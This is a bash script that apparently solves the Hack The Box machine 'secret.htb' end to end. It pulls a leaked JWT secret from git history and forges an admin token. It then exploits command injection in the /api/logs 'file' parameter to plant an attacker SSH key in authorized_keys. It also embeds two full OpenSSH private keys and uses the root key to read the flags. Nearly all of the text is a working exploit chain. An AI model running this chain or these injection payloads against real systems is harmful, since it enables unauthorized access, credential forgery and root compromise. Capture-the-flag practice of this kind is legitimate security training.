#!/bin/bash

if [ -e ./files.zip ];
then
    files=1
else
    wget http://secret.htb/download/files.zip 2>&1 | grep -v "." | tr "\n" "\r";
fi

if [ -e ./local-web ];
then
    local_web=1
else
    unzip files.zip;
fi

cd ./local-web/;
cat .git/logs/refs/heads/master | awk '{print $2}' | 
while read commit;
do
    if [[ `git ls-tree $commit | sed -n 1p | grep -c ".env"` == 1 ]];
    then
        h=$(git ls-tree $commit | sed -n 1p | awk '{print $3}')
        if git cat-file -p $h | grep "TOKEN_SECRET = secret";
        then
            continue
        else
            #secret: "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
            secret=$(git cat-file -p $h | sed -n 2p | cut -d' ' -f3);

            # Register user
			curl -X POST http://secret.htb:3000/api/user/register -H 'Content-Type: application/json' -d '{"name": "xxxxxx", "email": "xxxxxx@gmail.com", "password": "1234567890"}' 2>&1 | grep -v "."

			# Login user and get user_token
			user_token=$(curl -X POST http://secret.htb:3000/api/user/login -H 'Content-Type: application/json' -d '{"email": "xxxxxx@gmail.com", "password": "1234567890"}' 2>&1 | tail -1)

			# Modify user_token
			payload=$(echo $(echo $user_token | cut -d '.' -f2 | openssl base64 -d -A) | tr "\n" "}" | sed 's/\}\}/\}/' | sed 's/xxxxxx\@gmail\.com/theadmin/' | sed 's/xxxxxx/theadmin/' | base64 -w0 | sed 's/\+/-/' | sed -E 's/=+$//')
			head_payload=$(echo -n "$(echo -n $user_token | cut -d '.' -f1).$payload")
			#head_payload="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRoZWFkbWluIn0"
			signature=$(echo -n "$head_payload" | openssl dgst -binary -sha256 -hmac "$secret" | base64 -w0 | sed 's/\+/-/g' | sed 's/\//_/g' | sed -E 's/=+$//')
			admin_token="$head_payload.$signature"

			echo "[+] Token is modified!"
			echo "Token: $admin_token"

			# Check us privileges
			res=$(curl http://secret.htb:3000/api/priv -X GET -H "auth-token: $admin_token" 2>&1 | grep -c "welcome back admin")

			if [[ $res == 1 ]];
			then
				echo "[+] You are Admin!"
			else
				echo "[-] Fail aithorized."
			fi

			# Exploitation
			res=$(curl "http://secret.htb:3000/api/logs?file=/etc/passwd;mkdir%20%2Fhome%2Fdasith%2F.ssh" -X GET -H "auth-token: $admin_token" 2>&1 | grep -c "killed")
			res=$(curl "http://secret.htb:3000/api/logs?file=/etc/passwd;echo%20%27c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDdHBCMkpxOFNwcFB3Nm5yVTVGSmVHUDkrM00xSmJyVGZpMGdoT1Zheit6SlF0U253aVpoZXVmT043MlVqRDFlSVNqaDh3YTMvMXNQR1Jpeng0bVJiSEQzUnNxSkhKNzRkTWFXZU9UU3oyeEtkalo3a0tta1YrUWE1YmRZamVMTzkrNWVwQ2d0cnhpbGQvQldVZDZNRm1XSTBSOXhweko2MUR1VFlQd3dIcW5wS0F3c3dlK295S0VZSzArenNHeFlURXRmRXNReDNtcXlpakFKUGg2aUk4WEpSWW5ERzd5UGdwdGFRbnYzeXhRWHFrRjFGMzNIZWdZZG5BN3NUaWlYN0RCdW9wd0VUMDJhRS9OZWpVbktRcXl3cjM2aGIrZFBLVFkvTzhiRXRGS3FMb2V2WS9QVWlpa0JwQmo5eG4xSUhGM2M0c2F2QjRwUFpFcFVDejdYb3NJVFhnY0RKSGE2cDdZWklva3RmeFhkTXRjUDI1TG1xMlhCZFJ2cjluc2hMeWlVZ2VhL3daa2h4SlNhZFcxcndOK1BYYTUzeTN5NEpmU3prNFhkK2NkR0hobkF2aUVIMGxsT2dKVG5XVGhyRjVwTkdWVHRXSlgyNE8rcHY5Z1B5VUN3LzZQNmR0R2EvVDNsMlp1bEZJSFd6b3duOCs3ckV3SUx1RGc0aDR2Yk09IHJvb3RAcHQtbGludXgK%27%7Cbase64%20-d%20%3E%2Fhome%2Fdasith%2F.ssh%2Fauthorized_keys" -X GET -H "auth-token: $admin_token" 2>&1 | grep -c "killed")

			if [[ $res == 0 ]];
			then
				echo "[+] PWNED!"
				break
			else
				echo "[-] Fail"
			fi
        fi
    fi
done

# Get ssh session of dasith
dasith_key="-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n"
cd ../
echo -e $dasith_key > ./dasith.key
chmod 600 ./dasith.key
# See root_exploit_PoC.txt
#scp -i ./key ./root_exploit.sh dasith@secret.htb:/tmp/root_exploit.sh
#ssh -i ./key dasith@secret.htb /tmp/root_exploit.sh
#scp -i ./key dasith@secret:/tmp/id_rsa ./root.key
root_key="""-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n"""
echo -e $root_key > root.key
chmod 600 ./root.key
ssh -i ./root.key root@secret.htb "echo -n 'USER FLAG: ';cat /home/dasith/user.txt;echo -n 'ROOT FLAG: ';cat /root/root.txt"
rm -rf ./dasith.key ./root.key
